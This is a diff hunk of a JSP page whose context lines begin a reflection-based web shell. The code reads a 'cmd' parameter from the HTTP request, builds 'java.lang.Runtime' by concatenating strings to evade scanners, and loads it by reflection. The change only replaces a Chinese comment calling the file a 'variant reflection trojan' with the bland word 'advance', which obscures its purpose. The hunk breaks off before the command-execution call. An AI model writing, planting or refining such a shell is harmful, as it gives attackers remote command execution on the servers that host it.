@@ -1,6 +1,6 @@
 <%@ page language="java" pageEncoding="UTF-8" %>
 <%
-    // 变型的反射马
+    // advance
     String cmd = request.getParameter("cmd");
     String name = "java.lang."+"Runtime";
     Class rt = Class.forName(name);
